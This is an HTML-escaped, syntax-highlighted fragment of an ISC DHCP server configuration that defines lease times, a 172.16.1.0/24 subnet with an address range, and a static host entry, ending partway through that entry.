&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;domain-name-servers&lt;/span&gt; &lt;span class="nt"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;8&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;140&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;113&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;subnet-mask&lt;/span&gt; &lt;span class="nt"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;routers&lt;/span&gt; &lt;span class="nt"&gt;172&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;16&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;254&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;broadcast-address&lt;/span&gt; &lt;span class="nt"&gt;172&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;16&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;default-lease-time&lt;/span&gt; &lt;span class="nt"&gt;3600&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;max-lease-time&lt;/span&gt; &lt;span class="nt"&gt;7200&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;ddns-update-style&lt;/span&gt; &lt;span class="nt"&gt;none&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;log-facility&lt;/span&gt; &lt;span class="nt"&gt;local7&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;pool&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;subnet&lt;/span&gt; &lt;span class="nt"&gt;172&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;16&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;netmask&lt;/span&gt; &lt;span class="nt"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;255&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt;range&lt;/span&gt; &lt;span class="err"&gt;172.16.1.101&lt;/span&gt; &lt;span class="err"&gt;172.16.1.200&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;static&lt;/span&gt; &lt;span class="nt"&gt;private&lt;/span&gt; &lt;span class="nt"&gt;ip&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="nt"&gt;host&lt;/span&gt; &lt;span class="nt"&gt;mail-q&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt;hardware&lt;/span&gt; &lt;span class="err"&gt;ethernet&lt;/span&gt; &lt;span class="err"&gt;5&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;97&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;c3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; 